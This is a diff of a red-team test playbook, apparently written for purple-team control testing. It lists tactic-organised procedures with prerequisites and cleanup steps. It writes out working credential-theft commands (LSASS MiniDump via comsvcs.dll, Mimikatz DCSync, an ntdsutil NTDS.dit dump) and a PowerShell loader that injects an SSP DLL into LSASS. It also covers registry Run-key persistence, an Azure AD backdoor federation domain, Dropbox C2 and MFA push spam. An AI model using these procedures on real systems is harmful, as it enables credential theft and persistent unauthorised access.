@@ -1,6 +1,22 @@
 # General
 
+# OT
+
 # Initial Access
+
+## MFA Push Spam - General guidance
+
+Push-based MFA systems are susceptible to abuse by attackers because they allow an attacker to send a large volume of MFA requests to a user in order to induce that user to accept the prompt in the hopes it ends the requests.
+
+Spam a target user with MFA approval prompts. Unlike a real-world scenario, this is not meant to test the human response to being inundated with MFA requests but rather the technical security controls for such a situation.
+
+### Guidance
+
+Send at least 10 MFA requests to the target user
+
+### Notes
+
+- If MFA is in place, but it does not use some form of zero-knowledge approval (e.g. push notification accept, SMS accept, etc), then it should be considered a block. For example, if the MFA systems requires entering a one-time code, then it would not be susceptible to this attack and therefore be blocked. If no MFA is enforced, it should be considered not blocked.
 
 ## Malicious ISOs - Generic ISO-wrapped payload
 
@@ -17,41 +33,21 @@ Use an ISO to deliver a malicious executable payload
    bash> mkisofs -J -o {{ iso }} {{ payload }}
    ```
 
-## MFA Push Spam - General guidance
+## Cloud storage sharing - General guidance
 
-Push-based MFA systems are susceptible to abuse by attackers because they allow an attacker to send a large volume of MFA requests to a user in order to induce that user to accept the prompt in the hopes it ends the requests.
+### Prerequisites
 
-Spam a target user with MFA approval prompts. Unlike a real-world scenario, this is not meant to test the human response to being inundated with MFA requests but rather the technical security controls for such a situation.
+- Have an account on a cloud storage service that allows sharing files via email
 
 ### Guidance
 
-Send at least 10 MFA requests to the target user
+Upload then share a file with a target email address via the service. For example, in Google Drive, right click -> share -> share -> enter email -> enter message -> send.
 
 ### Notes
 
-- If MFA is in place, but it does not use some form of zero-knowledge approval (e.g. push notification accept, SMS accept, etc), then it should be considered a block. For example, if the MFA systems requires entering a one-time code, then it would not be susceptible to this attack and therefore be blocked. If no MFA is enforced, it should be considered not blocked.
+Some cloud storage services perform file scanning of uploaded files for malicious content. Consider uploading the file immediately before sharing to limit the impact on testing.
 
-## Suspicious connections - General guidance
-
-### Guidance
-
-When using a browser, you can override the user agent string by using an extension. For example:
-
-- Firefox: https://addons.mozilla.org/en-US/firefox/addon/user-agent-string-switcher
-- Chrome: https://chromewebstore.google.com/detail/user-agent-switcher-and-m/bhchdcejhohfmigjafbampogmaanbfkg
-
-You can override your source IP by using a VPN running on a VPS hosted in an anomalous geolocation.
-
-## Suspicious connections - General guidance
-
-### Guidance
-
-When using a browser, you can override the user agent string by using an extension. For example:
-
-- Firefox: https://addons.mozilla.org/en-US/firefox/addon/user-agent-string-switcher
-- Chrome: https://chromewebstore.google.com/detail/user-agent-switcher-and-m/bhchdcejhohfmigjafbampogmaanbfkg
-
-You can override your source IP by using a VPN running on a VPS hosted in an anomalous geolocation.
+# Execution
 
 # Defense Evasion
 
@@ -193,160 +189,6 @@ Transfer tool into environment by downloading from the Internet
 
 - The maliciousness level of the binary should align with the intent of the test. For testing signature-based checks, use a known malicious tool, such as Mimikatz. For testing sandboxing or similar network security technologies, use an unknown yet still overtly malicious tool, such as one built around the current attack infrastructure. By default, start with the most malicious choice.
 
-## Web Service C2 - via Dropbox C3 channel
-
-Establish a command-and-control channel via a legitimate web service so that malicious traffic is masked
-
-Use C3's Dropbox channel for command-and-control
-
-### Prerequisites
-
-1. Install and run C3 on a server
-2. Create a Dropbox account 
-3. Create a Dropbox developer app with read/write permissions then copy the access token
-4. Create a Dropbox channel in C3 using the app token
-5. Export a relay payload
-
-### Guidance
-
-Execute the relay payload
-
-### References
-
-1. Example of C3 using Dropbox: https://labs.withsecure.com/publications/attack-detection-fundamentals-c2-and-exfiltration-lab-3
-
-# Credential Access
-
-## LSASS dumping using comsvcs.dll - via rundll32.exe
-
-Use `rundll32.exe` to call the `MiniDump` export from `comsvcs.dll`
-
-### Prerequisites
-
-- Administrator rights
-- SeDebugPrivilege
-
-### Guidance
-
-```
-shell> rundll32.exe c:\windows\system32\comsvcs.dll MiniDump {{ lsass_pid }} {{ outpath }} full
-```
-
-This command must be run from a shell process that has `SeDebugPrivilege` enabled. 
-PowerShell should work to this end. 
-
-You can acquire `SeDebugPrivilege` for `cmd.exe` by launching it as `SYSTEM` via Sysinternals' `PsExec` (`psexec -sid cmd`). 
-Alternatively, you can use the VBScript file from `modexp`: https://modexp.wordpress.com/2019/08/30/minidumpwritedump-via-com-services-dll/ (`cscript procdump.vbs lsass.exe`)
-
-### Cleanup
-
-- Delete the dump file
-
-## DCSync - via Mimikatz
-
-The DCSync attack mimics normal replication behavior between DCs, allowing for remote extraction of credentials
-
-Uses Mimikatz's lsadump::dcsync command
-
-### Prerequisites
-
-- Command execution in the context of an account with Active Directory replication rights
-- User accounts to target
-- Mimikatz binary (https://github.com/gentilkiwi/mimikatz)
-
-### Guidance
-
-```
-mimikatz> lsadump::dcsync /domain:{{ domain }} /user:{{ target_username }}
-```
-
-### Troubleshooting
-
-If Mimikatz is giving an error of `ERROR kuhl_m_lsadump_dcsync ; GetNCChanges: 0x00002105 (8453)`, try the following:
-
-```
-cmd> klist purge
-cmd> gpupdate /force
-```
-
-## LSASS Security Service Provider - Temporary SSP
-
-Register a Security Service Provider (SSP) for LSASS. This will trigger a DLL load of the SSP into LSASS.
-
-Register an SSP temporarily by calling the AddSecurityPackage() API.
-
-### Prerequisites
-
-- Local administrator 
-- A compiled SSP DLL and a method of calling the AddSecurityPackage() API (e.g. custom exe payload)
-    - SSP source: https://github.com/2XXE-SRA/payload_resources/blob/master/c/lsa_ssp.c
-      - This can be compiled using MinGW via `x86_64-w64-mingw32-gcc -shared -municode -o ssp.dll lsa_ssp.c -lsecur32`
-    - SSP loader: https://github.com/2XXE-SRA/payload_resources/blob/master/powershell/ssp_loader.ps1
-
-### Guidance
-
-Open an administrative PowerShell terminal. 
-
-If using the script linked above, run the following command
-
-```
-PS> .\ssp_loader.ps1 {{ ssp_dll_path }}
-```
-
-If loading manually, first set the path to the compiled SSP DLL into a variable
-
-```
-PS> $DllName = "{{ ssp_dll_path }}"
-```
-
-Then load the SSP into LSASS
-
-```
-PS>
-$DynAssembly = New-Object System.Reflection.AssemblyName('SSPI2')
-$AssemblyBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly($DynAssembly, [Reflection.Emit.AssemblyBuilderAccess]::Run)
-$ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('SSPI2', $False)
-
-$TypeBuilder = $ModuleBuilder.DefineType('SSPI2.Secur32', 'Public, Class')
-$PInvokeMethod = $TypeBuilder.DefinePInvokeMethod('AddSecurityPackage',
-    'secur32.dll',
-    'Public, Static',
-    [Reflection.CallingConventions]::Standard,
-    [Int32],
-    [Type[]] @([String], [IntPtr]),
-    [Runtime.InteropServices.CallingConvention]::Winapi,
-    [Runtime.InteropServices.CharSet]::Auto)
-
-$Secur32 = $TypeBuilder.CreateType()
-
-if ([IntPtr]::Size -eq 4) {
-    $StructSize = 20
-} else {
-    $StructSize = 24
-}
-
-$StructPtr = [Runtime.InteropServices.Marshal]::AllocHGlobal($StructSize)
-[Runtime.InteropServices.Marshal]::WriteInt32($StructPtr, $StructSize)
-
-$Secur32::AddSecurityPackage($DllName, $StructPtr)
-```
-
-### Cleanup
-
-- The SSP will be removed on system reboot or after manually calling DeleteSecurityPackage()
-
-### References
-
-- https://www.ired.team/offensive-security/credential-access-and-credential-dumping/intercepting-logon-credentials-via-custom-security-support-provider-and-authentication-package#loading-ssp-without-reboot
-
-# Impact
-
-## GPO Modifications - General guidance
-
-### Notes
-
-- Create a new group policy object to avoid modifying production policies. Additionally, consider disabling the policy before modifying it. 
-
 # Lateral Movement
 
 # Persistence
@@ -381,6 +223,22 @@ CMD> sc create {{ service_name }} binPath= "{{ command }}"
 
 ```
 CMD> sc delete {{ service_name }}
+```
+
+## Registry Run Key Persistence - via reg.exe
+
+Use built-in reg.exe to persist via the Registry by setting a command to be run on user login
+
+### Guidance
+
+```
+CMD> reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "{{ key_name }}" /t REG_SZ /F /D "{{ command }}"
+```
+
+### Cleanup
+
+```
+CMD> reg delete "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /F /V "{{ key_name }}"
 ```
 
 ## Persistence in Azure AD - Register a New Device
@@ -425,10 +283,10 @@ Use AADInternals to create a backdoor federation domain for persisting access to
 
 ### Prerequisites
 
-- Permissions to modify domain authentication settings
-  - and an access token for the user with these permissions, referred to as `$at` in example commands. To retrieve a token, use `$at=Get-AADIntAccessTokenForAADGraph -Credentials (get-credential)` and proceed through the prompts
 - AADInternals installed
   - `Install-Module AADInternals`
+- Permissions to modify domain authentication settings
+  - and an access token for the user with these permissions, referred to as `$at` in example commands. To retrieve a token, use `$at=Get-AADIntAccessTokenForAADGraph -Credentials (get-credential)` and proceed through the prompts
 - A target verified domain in Azure AD
   - To add a domain, Go to Azure AD -> custom domain names -> add -> set the provided DNS records for your domain -> wait for the verification to compelete
 - A user with an immutable ID set
@@ -464,19 +322,219 @@ Open-AADIntOffice365Portal -ImmutableID {{ id }} -UseBuiltInCertificate -ByPassM
 - https://o365blog.com/post/aadbackdoor/
 - https://www.mandiant.com/resources/blog/detecting-microsoft-365-azure-active-directory-backdoors
 
-# Exfiltration
+# Credential Access
 
-## DLP Test - General use
+## DCSync - via Mimikatz
 
-DLP Test (dlptest.com) is a web utility for testing if exfiltration of sensitive data is successful
+The DCSync attack mimics normal replication behavior between DCs, allowing for remote extraction of credentials
 
-General usage notes for DLP Test
+Uses Mimikatz's lsadump::dcsync command
+
+### Prerequisites
+
+- Command execution in the context of an account with Active Directory replication rights
+- User accounts to target
+- Mimikatz binary (https://github.com/gentilkiwi/mimikatz)
+
+### Guidance
+
+```
+mimikatz> lsadump::dcsync /domain:{{ domain }} /user:{{ target_username }}
+```
+
+### Troubleshooting
+
+If Mimikatz is giving an error of `ERROR kuhl_m_lsadump_dcsync ; GetNCChanges: 0x00002105 (8453)`, try the following:
+
+```
+cmd> klist purge
+cmd> gpupdate /force
+```
+
+## LSASS dumping using comsvcs.dll - via rundll32.exe
+
+Use `rundll32.exe` to call the `MiniDump` export from `comsvcs.dll`
+
+### Prerequisites
+
+- Administrator rights
+- SeDebugPrivilege
+
+### Guidance
+
+```
+shell> rundll32.exe c:\windows\system32\comsvcs.dll MiniDump {{ lsass_pid }} {{ outpath }} full
+```
+
+This command must be run from a shell process that has `SeDebugPrivilege` enabled. 
+PowerShell should work to this end. 
+
+You can acquire `SeDebugPrivilege` for `cmd.exe` by launching it as `SYSTEM` via Sysinternals' `PsExec` (`psexec -sid cmd`). 
+Alternatively, you can use the VBScript file from `modexp`: https://modexp.wordpress.com/2019/08/30/minidumpwritedump-via-com-services-dll/ (`cscript procdump.vbs lsass.exe`)
+
+### Cleanup
+
+- Delete the dump file
+
+## Browser credential dumping - Chromium-based via SharpChrome
+
+https://github.com/GhostPack/SharpDPAPI
+
+### Prerequisites
+
+- kill all processes for the target browser
+- compiled binary 
+	- using Visual Studios: -> load solution file -> set to "Release" -> build
+
+## Extract NTDS.dit Credentials - via ntdsutil.exe
+
+Dump domain hashes for all domain users on the domain controller via ntdsutil.exe, which uses Volume Shadow Services (VSS)
+
+### Prerequisites
+
+- Elevated command execution on a DC
+- Sufficient free disk space on the DC (verify size of ntds.dit file against free disk space)
+
+### Guidance
+
+Note the existing snapshots before dumping NTDS.dit:
+
+```
+cmd> ntdsutil.exe snapshot "list all" quit quit
+```
+
+Dump NTDS.dit using one of the following methods, noting the snapshot number. The output path should be an empty directory:
+
+```
+cmd> ntdsutil “ac in ntds” “ifm” “cr fu {{ output_path }}” q q
+```
 
 ### Notes
 
-- If sample sensitive data is needed, the site provides it in different types and formats
-- The site supports HTTP, HTTPS, and FTP
-- Do not upload actual sensitive data to the site
+In the case that ntdsutil is killed during execution (either manually or by an EDR product), the snapshots need to be cleaned up. You cannot do so using vssadmin because they are in use. Delete the snapshot with the following command, using the snapshot number from the dump command in the above guidance:
+
+```
+cmd> ntdsutil.exe snapshot "list all" "delete {{ snapshot_number }}" quit quit
+```
+
+If the command itself is blocked by a security tool, ntdsutil.exe's interactive mode can be used if executing interactively. The commands are the same but should be used one at a time:
+
+```
+cmd> ntdsutil.exe 
+ntdsutil> ac in ntds 
+ntdsutil> ifm 
+ntdsutil> cr fu C:\path\to\ntds-dump
+ntdsutil> q q
+```
+
+### Cleanup
+
+1. Delete the snapshot if necessary (see "Notes" above)
+1. Remove the NTDS.dit copy at the path you specified during execution
+
+## LSASS Security Service Provider - Temporary SSP
+
+Register a Security Service Provider (SSP) for LSASS. This will trigger a DLL load of the SSP into LSASS.
+
+Register an SSP temporarily by calling the AddSecurityPackage() API.
+
+### Prerequisites
+
+- Local administrator 
+- A compiled SSP DLL and a method of calling the AddSecurityPackage() API (e.g. custom exe payload)
+    - SSP source: https://github.com/2XXE-SRA/payload_resources/blob/master/c/lsa_ssp.c
+      - This can be compiled using MinGW via `x86_64-w64-mingw32-gcc -shared -municode -o ssp.dll lsa_ssp.c -lsecur32`
+    - SSP loader: https://github.com/2XXE-SRA/payload_resources/blob/master/powershell/ssp_loader.ps1
+
+### Guidance
+
+Open an administrative PowerShell terminal. 
+
+If using the script linked above, run the following command
+
+```
+PS> .\ssp_loader.ps1 {{ ssp_dll_path }}
+```
+
+If loading manually, first set the path to the compiled SSP DLL into a variable
+
+```
+PS> $DllName = "{{ ssp_dll_path }}"
+```
+
+where `ssp_dll_path` is the absolute path to the SSP DLL.
+
+Then load the SSP into LSASS
+
+```
+PS>
+$DynAssembly = New-Object System.Reflection.AssemblyName('SSPI2')
+$AssemblyBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly($DynAssembly, [Reflection.Emit.AssemblyBuilderAccess]::Run)
+$ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('SSPI2', $False)
+
+$TypeBuilder = $ModuleBuilder.DefineType('SSPI2.Secur32', 'Public, Class')
+$PInvokeMethod = $TypeBuilder.DefinePInvokeMethod('AddSecurityPackage',
+    'secur32.dll',
+    'Public, Static',
+    [Reflection.CallingConventions]::Standard,
+    [Int32],
+    [Type[]] @([String], [IntPtr]),
+    [Runtime.InteropServices.CallingConvention]::Winapi,
+    [Runtime.InteropServices.CharSet]::Auto)
+
+$Secur32 = $TypeBuilder.CreateType()
+
+if ([IntPtr]::Size -eq 4) {
+    $StructSize = 20
+} else {
+    $StructSize = 24
+}
+
+$StructPtr = [Runtime.InteropServices.Marshal]::AllocHGlobal($StructSize)
+[Runtime.InteropServices.Marshal]::WriteInt32($StructPtr, $StructSize)
+
+$Secur32::AddSecurityPackage($DllName, $StructPtr)
+```
+
+### Notes
+
+- You can verify that the DLL was loaded into LSASS using one of the following methods:
+  - Use perfmon: (as admin) `perfmon /res` -> CPU -> Select checkbox for `lsass.exe` -> Associated Modules -> look for SSP DLL
+  - Use tasklist: (as admin) `tasklist /fi "imagename eq lsass.exe" /m` -> look for SSP DLL
+
+### Cleanup
+
+- The SSP will be removed on system reboot or after manually calling DeleteSecurityPackage()
+
+### References
+
+- https://www.ired.team/offensive-security/credential-access-and-credential-dumping/intercepting-logon-credentials-via-custom-security-support-provider-and-authentication-package#loading-ssp-without-reboot
+
+# Impact
+
+## GPO Modifications - General guidance
+
+### Guidance
+
+To modify a new domain GPO via the Group Policy Editor:
+
+1. Log onto domain controller as domain admin
+2. Open the Server Manager -> Tools -> Group Policy Management
+3. On the left menu -> Expand the forest/domains sections then locate the target domain
+4. Expand the target domain and locate the "Group Policy Objects" folder
+5. Right-click the folder -> New -> Enter a name
+6. Locate the newly created GPO -> right-click -> GPO Status -> Un-check enabled
+7. Edit the GPO's setting(s) as desired
+
+### Cleanup
+
+Delete the GPO if using a new GPO, otherwise revert any settings changes
+
+### Notes
+
+Create a new group policy object to avoid modifying production policies. Additionally, consider disabling the policy before modifying it. 
+
+# Exfiltration
 
 ## Exfiltration to cloud storage - General guidance
 
@@ -494,7 +552,17 @@ Select and use a well-known cloud storage service
 
 - Where possible, use cloud storage service already in use in the environment
 
-# Execution
+## DLP Test - General use
+
+DLP Test (dlptest.com) is a web utility for testing if exfiltration of sensitive data is successful
+
+General usage notes for DLP Test
+
+### Notes
+
+- If sample sensitive data is needed, the site provides it in different types and formats
+- The site supports HTTP, HTTPS, and FTP
+- Do not upload actual sensitive data to the site
 
 # Collection
 
